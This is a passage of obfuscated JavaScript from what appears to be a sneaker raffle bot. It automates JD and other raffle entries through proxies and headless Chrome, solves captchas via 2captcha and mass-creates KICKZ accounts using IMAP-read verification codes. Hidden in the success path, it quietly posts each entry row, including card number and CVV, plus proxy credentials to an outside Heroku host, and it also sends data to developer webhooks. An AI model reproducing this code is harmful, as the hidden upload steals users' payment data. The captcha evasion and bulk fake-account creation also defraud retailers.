_0x4ef477['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4ef477['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x2be9fc(0x4b0), await _0x4ef477['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x3f8da4[_0x36a6af]['CardNumber']), await _0x2be9fc(0x320), await _0x4ef477['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x4ef477['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x3f8da4[_0x36a6af]['ExpiryDate']), await _0x2be9fc(0x4b0), await _0x4ef477['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x4ef477['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x3f8da4[_0x36a6af]['CVV']), await _0x2be9fc(0x226), await _0x4ef477['type']('input[name=\x22holderName\x22]', '' + _0x3f8da4[_0x36a6af]['NameOnCard']), await _0x2be9fc(0x226), await _0x4ef477['click']('button.adyen-checkout__button'), console['log'](_0x451967() + '\x20[' + _0x7c98d0['name'] + ']\x20Task\x20' + (_0x36a6af + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x4ef477['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x2be9fc(0xbb8);
                        } catch (_0x1c6383) {
                            console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x7c98d0['name'] + ']\x20Task\x20' + (_0x36a6af + 0x1) + '\x20:\x203DS\x20Failed')), _0x2a13a3 = '3DS\x20Error\x20' + _0x1c6383;
                            var _0x2924cd = await _0x14203e(_0x3f8da4[_0x36a6af], _0x7c98d0, 'dev', !![], _0x2a13a3);
                            _0x5d377d['errorDEV'] = { 'embeds': [_0x2924cd] };
                            _0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '' && await _0x1bfffd(_0x30cea3['webhook'], _0x5d377d['errorDEV']);
                            await _0x1bfffd(_0x31e47f, _0x5d377d['errorDEV']);
                            continue;
                        }
                        _0x34c52d(_0x3f8da4[_0x36a6af], _0x7c98d0), console['log'](_0x10a2e3['green'](_0x451967() + '\x20[' + _0x7c98d0['name'] + ']\x20Task\x20' + (_0x36a6af + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x3d3355 = _0x3f8da4[_0x36a6af];
                        try {
                            prxdata = {
                                'username': _0x3373db['replace']('#', ''),
                                'module': _0x7c98d0['name'],
                                'entrydata': JSON['stringify'](_0x3d3355),
                                'proxy': '' + _0x4740ca[_0x36a6af]
                            };
                            var _0x232a6b = JSON['stringify'](prxdata);
                            let _0x3d4f64 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x2c480f['post']('https://jraffles.herokuapp.com/success', _0x232a6b, _0x3d4f64);
                        } catch (_0x48808a) {
                        }
                        if (_0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '')
                            try {
                                await _0x1bfffd(_0x30cea3['webhook'], _0x5d377d['succesDEVMSG']);
                            } catch {
                            }
                        await _0x2be9fc(0xc8), await _0x1bfffd(_0x301a88, _0x5d377d['succesDEVMSG']), await _0x2be9fc(0xc8);
                        try {
                            await _0x1bfffd(_0x3b111f, _0x5d377d['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x3e8a60) {
                        console['log'](_0x451967() + '\x20[' + _0x7c98d0['name'] + ']\x20Task\x20' + (_0x36a6af + 0x1) + '\x20:\x20' + _0x3e8a60), _0x2a13a3 = '' + _0x3e8a60;
                        var _0x2924cd = await _0x14203e(_0x3f8da4[_0x36a6af], _0x7c98d0, 'dev', !![], _0x2a13a3);
                        _0x5d377d['errorDEV'] = { 'embeds': [_0x2924cd] }, _0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '' && await _0x1bfffd(_0x30cea3['webhook'], _0x5d377d['errorDEV']), await _0x1bfffd(_0x31e47f, _0x5d377d['errorDEV']), _0x3b793a = 'yes';
                    } finally {
                        _0x1e3110['close']();
                        if (_0x3b793a == 'yes' && _0x137938 != 0x5) {
                            console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x7c98d0['name'] + ']\x20Task\x20' + (_0x36a6af + 0x1) + '\x20:\x20Retrying\x20(' + _0x137938 + '\x20/\x205)')), _0x36a6af = _0x36a6af - 0x1, _0x137938 = _0x137938 + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x30cea3['delay'] + '\x20ms'), await _0x2be9fc(_0x30cea3['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0xf8c2a7, _0x543e86, _0x2aff50) {
                var _0x4a667d = ![], _0x3adb0f = ![];
                if (_0x30cea3['captchaKey'] == '' || _0x30cea3['captchaKey'] == undefined)
                    return console['log'](_0x10a2e3['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x3d8cc4['use'](_0x29d882()), _0x3d8cc4['use'](_0x173890({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x30cea3['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x2716a9 = 0x0; _0x2716a9 < _0x543e86['length']; _0x2716a9++) {
                    if (_0x39692b != 'yes')
                        var _0x39692b = '', _0x2d1064 = 0x0;
                    var _0x44c3d9, _0x1b6d63 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x543e86[_0x2716a9]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x543e86[_0x2716a9]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x3373db
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x30cea3['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x1feaa0
                            }
                        ]
                    }];
                    const _0x30506f = { 'embeds': _0x1b6d63 };
                    _0x1a7b1b(_0xf8c2a7['name'] + '\x20Task\x20' + (_0x2716a9 + 0x1) + '\x20/\x20' + _0x543e86['length'] + '\x20||\x20File:\x20' + _0x733fd9 + '\x20Proxies:\x20' + _0x253bf1);
                    try {
                        await _0x319293(_0x543e86, _0x2716a9);
                    } catch {
                        _0x39692b = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x233b71 = await _0x14203e(_0x543e86[_0x2716a9], _0xf8c2a7, 'dev', ![]), _0x4c323f = await _0x14203e(_0x543e86[_0x2716a9], _0xf8c2a7, 'pub', ![]);
                    const _0x4f9632 = {
                        'succesDEVMSG': { 'embeds': [_0x233b71] },
                        'succesPUBMSG': { 'embeds': [_0x4c323f] }
                    };
                    if (_0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '')
                        try {
                            await _0x1bfffd(_0x30cea3['webhook'], _0x4f9632['succesDEVMSG']);
                        } catch {
                        }
                    await _0x2be9fc(0xc8), await _0x1bfffd(_0x301a88, _0x4f9632['succesDEVMSG']), await _0x2be9fc(0xc8);
                    try {
                        await _0x1bfffd(_0x3b111f, _0x4f9632['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x543e86[_0x2716a9]['Email'] == '' || _0x543e86[_0x2716a9]['Url'] == '' || _0x543e86[_0x2716a9]['FirstName'] == '' || _0x543e86[_0x2716a9]['LastName'] == '') {
                        console['log'](_0x451967() + '\x20[' + _0xae095a[taskModule]['name'] + ']\x20Task\x20' + (_0x2716a9 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x30cea3['useRandomProxy'] = ![])
                        var _0x393ba2 = _0x2aff50[_0x2716a9]['split'](':');
                    else
                        var _0x5e9d1f = Math['round'](Math['random']() * (_0x2aff50['length'] - 0x1)), _0x393ba2 = _0x2aff50[_0x5e9d1f]['split'](':');
                    var _0xea5913;
                    try {
                        _0xea5913 = await _0x3d8cc4['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x393ba2[0x0] + ':' + _0x393ba2[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0xea5913 = await _0x3d8cc4['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x393ba2[0x0] + ':' + _0x393ba2[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x546fbb = await _0xea5913['newPage']();
                        await _0x546fbb['authenticate']({
                            'username': '' + _0x393ba2[0x2],
                            'password': '' + _0x393ba2[0x3]
                        }), console['log'](_0x451967() + '\x20[' + _0xf8c2a7['name'] + ']\x20Task\x20' + (_0x2716a9 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x546fbb['setRequestInterception'](!![]), _0x546fbb['on']('request', _0x22354d => {
                            _0x22354d['resourceType']() === 'image' || _0x22354d['resourceType']() === 'font' || _0x22354d['resourceType']() === 'media' ? _0x22354d['abort']() : _0x22354d['continue']();
                        });
                        try {
                            await _0x546fbb['goto']('' + _0x543e86[_0x2716a9]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x546fbb['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x451967() + '\x20[' + _0xf8c2a7['name'] + ']\x20Task\x20' + (_0x2716a9 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x546fbb['type']('#comp_firstname', '' + _0x543e86[_0x2716a9]['FirstName']), await _0x546fbb['waitForSelector']('#comp_lastname'), await _0x546fbb['type']('#comp_lastname', '' + _0x543e86[_0x2716a9]['LastName']), await _0x546fbb['waitForSelector']('#comp_email'), await _0x546fbb['type']('#comp_email', '' + _0x543e86[_0x2716a9]['Email']), await _0x546fbb['waitForSelector']('#comp_paypalemail'), await _0x546fbb['type']('#comp_paypalemail', '' + _0x543e86[_0x2716a9]['Email']), await _0x546fbb['waitForSelector']('#comp_mobile_end'), await _0x546fbb['type']('#comp_mobile_end', '' + _0x543e86[_0x2716a9]['Phone']), await _0x546fbb['waitForSelector']('#comp_dob'), await _0x546fbb['type']('#comp_dob', '08/09/1992'), console['log'](_0x451967() + '\x20[' + _0xf8c2a7['name'] + ']\x20Task\x20' + (_0x2716a9 + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x543e86[_0x2716a9]['Size'] == 'RANDOM') {
                            const _0x1391c4 = await _0x546fbb['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x494eeb => {
                                return _0x494eeb['map'](_0x3b3e83 => _0x3b3e83['value']);
                            });
                            var _0x54144f = Math['round'](Math['random']() * (_0x1391c4['length'] - 0x2));
                            await _0x546fbb['select']('#shoesize', _0x1391c4[_0x54144f + 0x1]), await _0x2be9fc(0x3e8);
                        } else {
                            const _0x1bd814 = await _0x546fbb['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x181f6c => {
                                return _0x181f6c['map'](_0xd10b49 => _0xd10b49['innerText']);
                            }), _0x5a8be1 = await _0x546fbb['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x259193 => {
                                return _0x259193['map'](_0x67cf83 => _0x67cf83['value']);
                            });
                            var _0x5a1b77 = _0x543e86[_0x2716a9]['Size'];
                            for (var _0x4f1de9 = 0x1; _0x4f1de9 < _0x5a8be1['length']; _0x4f1de9++) {
                                var _0x5084ad = _0x1bd814[_0x4f1de9]['split']('\x20')[0x0];
                                if (_0x5084ad == _0x5a1b77) {
                                    await _0x546fbb['select']('#shoesize', _0x5a8be1[_0x4f1de9]);
                                    break;
                                } else {
                                    if (_0x4f1de9 + 0x1 == _0x5a8be1['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x546fbb['waitForSelector']('#comp_address1'), await _0x546fbb['type']('#comp_address1', _0x543e86[_0x2716a9]['Address1'] + '\x20' + _0x543e86[_0x2716a9]['HouseNumber']), await _0x546fbb['waitForSelector']('#comp_address2'), await _0x546fbb['type']('#comp_address2', '' + _0x543e86[_0x2716a9]['Address2']), await _0x546fbb['waitForSelector']('#comp_address2'), await _0x546fbb['type']('#comp_address3', '' + _0x543e86[_0x2716a9]['City']), await _0x546fbb['waitForSelector']('#comp_postcode'), await _0x546fbb['type']('#comp_postcode', '' + _0x543e86[_0x2716a9]['Zip']), console['log'](_0x451967() + '\x20[' + _0xf8c2a7['name'] + ']\x20Task\x20' + (_0x2716a9 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x2be9fc(0x4b0), await _0x546fbb['click']('label#emailhold'), await _0x2be9fc(0x5dc), await _0x546fbb['click']('#preauth_tandc_email\x20>\x20label'), await _0x2be9fc(0x5dc), await _0x546fbb['click']('#submit');
                        try {
                            await _0x546fbb['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x451967() + '\x20[' + _0xf8c2a7['name'] + ']\x20Task\x20' + (_0x2716a9 + 0x1) + '\x20:\x20' + _0x10a2e3['blue']('Awaiting\x20Paypal\x20Payment')), _0xea5913['on']('targetcreated', async _0x15b19a => {
                            if (_0x15b19a['type']() === 'page') {
                                const _0x1d45dd = await _0x15b19a['page']();
                                async function _0x4fb7cd() {
                                    try {
                                        await _0x546fbb['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x3adb0f = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x5f2365() {
                                    try {
                                        await _0x546fbb['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x4a667d = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x5f2365(), _0x4fb7cd(), await _0x2be9fc(0x493e0);
                            }
                        });
                        async function _0x30bb07() {
                            for (let _0x17d62c = 0x0; _0x17d62c < 0x12c; _0x17d62c++) {
                                if (_0x4a667d == !![]) {
                                    _0x39692b = 'no', _0x34c52d(_0x543e86[_0x2716a9], _0xf8c2a7), console['log'](_0x10a2e3['green'](_0x451967() + '\x20[' + _0xf8c2a7['name'] + ']\x20Task\x20' + (_0x2716a9 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '')
                                        try {
                                            await _0x1bfffd(_0x30cea3['webhook'], _0x4f9632['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x2be9fc(0xc8), await _0x1bfffd(_0x301a88, _0x4f9632['succesDEVMSG']), await _0x2be9fc(0xc8);
                                    try {
                                        await _0x1bfffd(_0x3b111f, _0x4f9632['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x3adb0f)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x2be9fc(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x2be9fc(0xbb8), await _0x546fbb['click']('.zoid-outlet'), await _0x2be9fc(0x7d0), await _0x30bb07();
                    } catch (_0x3264c8) {
                        console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0xf8c2a7['name'] + ']\x20Task\x20' + (_0x2716a9 + 0x1) + '\x20:\x20' + _0x3264c8)), _0x44c3d9 = '' + _0x3264c8;
                        var _0x291326 = await _0x14203e(_0x543e86[_0x2716a9], _0xf8c2a7, 'dev', !![], _0x44c3d9);
                        _0x4f9632['errorDEV'] = { 'embeds': [_0x291326] }, _0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '' && await _0x1bfffd(_0x30cea3['webhook'], _0x4f9632['errorDEV']), await _0x1bfffd(_0x31e47f, _0x4f9632['errorDEV']);
                    } finally {
                        _0xea5913 && _0xea5913['close']();
                        if (_0x39692b == 'yes' && _0x2d1064 != 0x5 && _0x44c3d9 != 'Size\x20Not\x20Found') {
                            console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0xf8c2a7['name'] + ']\x20Task\x20' + (_0x2716a9 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2d1064 + '\x20/\x205)')), _0x2716a9 = _0x2716a9 - 0x1, _0x2d1064 = _0x2d1064 + 0x1;
                            continue;
                        }
                        _0x39692b == 'yes' && _0x2d1064 >= 0x5 && (_0x48f0c7(afew[_0x2716a9], _0xf8c2a7), _0x39692b = 'no', _0x2d1064 = 0x0), console['log']('Waiting\x20for\x20' + _0x30cea3['delay'] + '\x20ms'), await _0x2be9fc(_0x30cea3['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x9622b1, _0x23c94f, _0x2e3d35) {
                    _0x3d8cc4['use'](_0x29d882()), _0x3d8cc4['use'](_0x173890({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x30cea3['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5d6d98 = 0x0; _0x5d6d98 < _0x23c94f['length']; _0x5d6d98++) {
                        const _0x48e074 = 'https://www.kickz.com/login';
                        if (_0x5aad2b != 'yes')
                            var _0x5aad2b = '', _0x1ae2c9 = 0x0;
                        _0x1a7b1b(_0x9622b1['name'] + '\x20Task\x20' + (_0x5d6d98 + 0x1) + '\x20/\x20' + _0x23c94f['length'] + '\x20||\x20File:\x20' + _0x733fd9 + '\x20Proxies:\x20' + _0x253bf1);
                        try {
                            await _0x319293(_0x23c94f, _0x5d6d98);
                        } catch {
                            _0x5aad2b = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x48f372 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x3373db
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x30cea3['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x1feaa0
                                }
                            ]
                        }];
                        const _0x276ab4 = { 'embeds': _0x48f372 };
                        var _0x2a78bc = await _0x14203e(_0x23c94f[_0x5d6d98], _0x9622b1, 'acc', ![]);
                        const _0x450981 = { 'succesDEVMSG': { 'embeds': [_0x2a78bc] } };
                        if (_0x23c94f[_0x5d6d98]['Email'] == '' || _0x23c94f[_0x5d6d98]['FirstName'] == '' || _0x23c94f[_0x5d6d98]['LastName'] == '') {
                            console['log'](_0x451967() + '\x20[' + _0x9622b1['name'] + ']\x20Task\x20' + (_0x5d6d98 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x23c94f[_0x5d6d98]['Password'] == '' && (_0x23c94f[_0x5d6d98]['Password'] = 'JRaffles23!');
                        if (_0x30cea3['useRandomProxy'] = ![])
                            var _0x1e27e2 = _0x2e3d35[_0x5d6d98]['split'](':');
                        else
                            var _0x55f02a = Math['round'](Math['random']() * (_0x2e3d35['length'] - 0x1)), _0x1e27e2 = _0x2e3d35[_0x55f02a]['split'](':');
                        var _0x24ec95;
                        try {
                            _0x24ec95 = await _0x3d8cc4['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1e27e2[0x0] + ':' + _0x1e27e2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x24ec95 = await _0x3d8cc4['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1e27e2[0x0] + ':' + _0x1e27e2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xbef2d0 = await _0x24ec95['newPage']();
                            await _0xbef2d0['authenticate']({
                                'username': '' + _0x1e27e2[0x2],
                                'password': '' + _0x1e27e2[0x3]
                            }), console['log'](_0x451967() + '\x20[' + _0x9622b1['name'] + ']\x20Task\x20' + (_0x5d6d98 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xbef2d0['setRequestInterception'](!![]), _0xbef2d0['on']('request', _0x2c8aec => {
                                _0x2c8aec['resourceType']() === 'image' || _0x2c8aec['resourceType']() === 'font' || _0x2c8aec['resourceType']() === 'media' ? _0x2c8aec['abort']() : _0x2c8aec['continue']();
                            }), await _0xbef2d0['goto'](_0x48e074), await _0x2be9fc(0xbb8), console['log'](_0x451967() + '\x20[' + _0x9622b1['name'] + ']\x20Task\x20' + (_0x5d6d98 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0xbef2d0['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0xbef2d0['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0xbef2d0['waitForSelector']('#button-register'), await _0x2be9fc(0x7d0), await _0xbef2d0['evaluate'](() => {
                                const _0x499dad = document['querySelector']('#button-register');
                                _0x499dad['click']();
                            }), console['log'](_0x451967() + '\x20[' + _0x9622b1['name'] + ']\x20Task\x20' + (_0x5d6d98 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x2be9fc(0x1388), await _0xbef2d0['waitForSelector']('#customer_salutation'), await _0xbef2d0['select']('#customer_salutation', 'mr'), await _0x2be9fc(0x7d0), await _0xbef2d0['waitForSelector']('#customer_firstname'), await _0xbef2d0['type']('#customer_firstname', '' + _0x23c94f[_0x5d6d98]['FirstName']), await _0x2be9fc(0x352), await _0xbef2d0['waitForSelector']('#customer_lastname'), await _0xbef2d0['type']('#customer_lastname', '' + _0x23c94f[_0x5d6d98]['LastName']), await _0x2be9fc(0x352), await _0xbef2d0['type']('#email-input', '' + _0x23c94f[_0x5d6d98]['Email']), await _0x2be9fc(0x352), await _0xbef2d0['type']('#email-confirm-input', '' + _0x23c94f[_0x5d6d98]['Email']), await _0x2be9fc(0x352), await _0xbef2d0['type']('#register-password', '' + _0x23c94f[_0x5d6d98]['Password']), await _0x2be9fc(0x352), await _0xbef2d0['type']('#password-confirm', '' + _0x23c94f[_0x5d6d98]['Password']), await _0x2be9fc(0x352), console['log'](_0x451967() + '\x20[' + _0x9622b1['name'] + ']\x20Task\x20' + (_0x5d6d98 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0xbef2d0['click']('#consent'), await _0x2be9fc(0x1f4);
                            const _0x17963c = await _0xbef2d0['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x17963c) {
                                console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x9622b1['name'] + ']\x20Task\x20' + (_0x5d6d98 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0xbef2d0['click']('#buttonRegister');
                            try {
                                await _0xbef2d0['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x451967() + '\x20[' + _0x9622b1['name'] + ']\x20Task\x20' + (_0x5d6d98 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x23c94f[_0x5d6d98]['Email']), await _0x2be9fc(0x4b0);
                            async function _0x5cc698() {
                                var _0xf67d93, _0x13ecaa = ![];
                                for (var _0x10b123 = 0x0; _0x10b123 < 0x18; _0x10b123++) {
                                    async function _0x2188b3() {
                                        var _0x284d4e = new _0x2e8fd8({
                                            'user': _0x30cea3['masterMail'],
                                            'password': _0x30cea3['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x5ab9e1(_0x590c14) {
                                            _0x284d4e['openBox']('INBOX', ![], _0x590c14);
                                        }
                                        _0x284d4e['once']('ready', function () {
                                            console['log'](_0x451967() + '\x20[' + _0x9622b1['name'] + ']\x20Task\x20' + (_0x5d6d98 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x5ab9e1(function (_0x577c01, _0x34be77) {
                                                console['log'](_0x451967() + '\x20[' + _0x9622b1['name'] + ']\x20Task\x20' + (_0x5d6d98 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x577c01)
                                                    throw _0x577c01;
                                                _0x284d4e['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x507dc6, _0x5f8b4d) {
                                                    if (!_0x5f8b4d || !_0x5f8b4d['length'])
                                                        console['log'](_0x451967() + '\x20[' + _0x9622b1['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x284d4e['end']();
                                                    else {
                                                        var _0x5ec514 = _0x284d4e['seq']['fetch'](_0x5f8b4d, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x5ec514['on']('message', function (_0x240ece, _0x4c1a42) {
                                                            var _0x41d8fd = '(#' + _0x4c1a42 + ')\x20';
                                                            _0x240ece['on']('body', function (_0x242519, _0x39e095) {
                                                                _0x2f2a1d(_0x242519, (_0xed2bf6, _0x310241) => {
                                                                    if (_0x310241['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x14a058 = _0x310241['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x200576 = _0x14a058[0x1]['split']('<')[0x0];
                                                                        _0xf67d93 = _0x200576;
                                                                    }
                                                                });
                                                            }), _0x240ece['once']('end', function () {
                                                            });
                                                        }), _0x5ec514['once']('error', function (_0x2e6050) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x5ec514['once']('end', function () {
                                                            _0x284d4e['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x284d4e['once']('error', function (_0x1c705e) {
                                            console['log'](_0x10a2e3['red'](_0x1c705e['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x13ecaa = !![];
                                        }), _0x284d4e['once']('end', async function () {
                                        }), _0x284d4e['connect']();
                                    }
                                    _0x2188b3(), await _0x2be9fc(0x1388);
                                    if (_0xf67d93)
                                        return _0xf67d93;
                                    if (_0x13ecaa)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x10b123 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x5cc698(), _0x2be9fc(0x320), console['log'](_0x451967() + '\x20[' + _0x9622b1['name'] + ']\x20Task\x20' + (_0x5d6d98 + 0x1) + '\x20:\x20Verifying..'), await _0xbef2d0['type']('#verificationCode', code), await _0x2be9fc(0x1f4), await _0xbef2d0['click']('#buttonVerify'), await _0x2be9fc(0x190), await _0xbef2d0['click']('#buttonVerify'), await _0x2be9fc(0x3e8);
                            try {
                                await _0xbef2d0['waitForSelector']('div.b-user_greeting'), _0x5aad2b = 'no', console['log'](_0x10a2e3['green'](_0x451967() + '\x20[' + _0x9622b1['name'] + ']\x20Task\x20' + (_0x5d6d98 + 0x1) + '\x20:\x20Account\x20' + _0x23c94f[_0x5d6d98]['Email'] + '\x20Generated\x20&\x20Verified!')), _0xa4bb3a['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x23c94f[_0x5d6d98]['Email'] + ',' + _0x23c94f[_0x5d6d98]['Password'] + ','), console['log'](_0x451967() + '\x20[' + _0x9622b1['name'] + ']\x20Task\x20' + (_0x5d6d98 + 0x1) + '\x20:\x20Account\x20' + _0x23c94f[_0x5d6d98]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '' && await _0x1bfffd(_0x30cea3['webhook'], _0x450981['succesDEVMSG']);
                                } catch {
                                }
                                await _0x1bfffd(_0x3708dd, _0x450981['succesDEVMSG']);
                            } catch {
                                _0x5aad2b = 'no', console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x9622b1['name'] + ']\x20Task\x20' + (_0x5d6d98 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x9622b1['name'] + ']\x20Task\x20' + (_0x5d6d98 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x4b8dbe) {
